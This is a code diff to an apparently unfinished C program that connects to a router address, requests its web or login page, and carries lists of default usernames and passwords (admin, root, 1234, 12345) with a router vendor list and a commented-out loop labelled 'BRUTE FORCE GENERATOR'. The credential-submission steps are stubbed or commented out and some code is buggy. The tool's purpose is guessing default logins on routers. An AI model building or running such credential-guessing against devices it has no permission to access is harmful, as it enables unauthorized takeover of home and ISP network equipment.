@@ -53,35 +53,41 @@ int main(int argc, char* argv[]) {
 	struct sockaddr_in
 		serv_addr;
 	char buff[1024],
-		connAddr[] = "172.238.141.253";
+		connAddr[] = "10.94.221.254";
 
 	// HTTP Headers
-	char headers[] = "",
-		headers_get[] = "GET / HTTP/1.1\n",
-		headers_acceptdata[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n",
-		headers_acceptlang[] = "Accept-Language: en-us,en;q=0.5\n",
-		headers_acceptdefl[] = "Accept-Encoding: gzip,deflate\n",
-		headers_acceptencp[] = "Accept-Charset: utf-8;q=0.7,*;q=0.7\n",
-		headers_connection[] = "Connection: keep-alive\n",
-		headers_keepalive[] = "Keep-Alive: 300\n",
-		headers_cachectrl[] = "Cache-Control: max-age=0\n",
-		headers_uprginsecreq[] = "Upgrade-Insecure-Requests: 1\n",
-		headers_useragent[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36\n",
-		headers_host[] = "Host: ", //insert connaddr
-		headers_auth[] = "\nAuthorization: Basic "; //insert base64
+	char** headers[] = {
+		"GET /",
+		"GET /login.html"
+		};
+
+	// Recognize by:
+	char** recognizeList[] = {
+		"",
+		};
+
+	// Vendor List
+	char** vendorList[] = {
+		"NONAME",
+		"CALLIX / Ericsson GPON",
+		"TP-LINK 2010-2015"
+		};
+	int vendorCnt = 0;
 
 	// Credentials
 	char** users[] = {
 		"admin",
 		"root",
-		"Admin"};
+		"Admin"
+		};
 	char** passwords[] = {
 		"admin",
 		"password",
 		"1234",
 		"root",
 		"Admin",
-		"12345"};
+		"12345"
+		};
 
 	memset(buff, '\0', sizeof(buff));
 
@@ -96,6 +102,7 @@ int main(int argc, char* argv[]) {
 	if (setConn(&sockfd, &serv_addr) < 0)
 		return 1;
 
+	// BRUTE FORCE GENERATOR
 	//char lox[] = "";
 	//for (int i = 0; i <= (sizeof(users)/8)-1; ++i) {
 	//	for (int o = 0; o <= (sizeof(passwords)/8)-1; ++o) {
@@ -107,34 +114,20 @@ int main(int argc, char* argv[]) {
 	//		memset(lox, '\0', sizeof(lox));
 	//	}
 	//}
-
-	char test[] = "123=";
-	write(sockfd, headers_get, sizeof(headers_get));
-	write(sockfd, headers_acceptdata, sizeof(headers_acceptdata));
-	write(sockfd, headers_acceptlang, sizeof(headers_acceptlang));
-	//write(sockfd, headers_acceptdefl, sizeof(headers_acceptdefl));
-	//write(sockfd, headers_acceptencp, sizeof(headers_acceptencp));
-	//write(sockfd, headers_connection, sizeof(headers_connection));
-	write(sockfd, headers_keepalive, sizeof(headers_keepalive));
-	//write(sockfd, headers_cachectrl, sizeof(headers_cachectrl));
-	//write(sockfd, headers_uprginsecreq, sizeof(headers_uprginsecreq));
-	write(sockfd, headers_useragent, sizeof(headers_useragent));
-	write(sockfd, headers_host, sizeof(headers_host));
-	write(sockfd, connAddr, sizeof(connAddr));
-	write(sockfd, test, sizeof(test));
-	write(sockfd, "\n\n", 3);
-
-	printf(buff);
-
-	int first = 0;
-
+	
+	write(sockfd, headers[0], sizeof(headers[0]));
+	write(sockfd, "\n\n", 2);
 	// web part
-	//while((n = read(sockfd, buff, sizeof(buff) - 1)) > 0) {
-		//buff[n] = 0;
+	while((n = read(sockfd, buff, sizeof(buff) - 1)) > 0) {
+		buff[n] = 0;
 
 		//if (strstr(buff,"d") != NULL) {
 		//	write(sockfd, "root\n", 5);
 		//}
+
+		if (strstr(buff,"Password") != NULL) {
+			
+		}
 
 		//if (strstr(buff,"Password") != NULL) {
 		//	write(sockfd, "admin\n", 6);
@@ -147,8 +140,8 @@ int main(int argc, char* argv[]) {
 
 		// display on screen
 		fputs(buff, stdout);
-		//printf("\n");
-	//}
+		printf("\n");
+	}
 
 	return 0;
 }
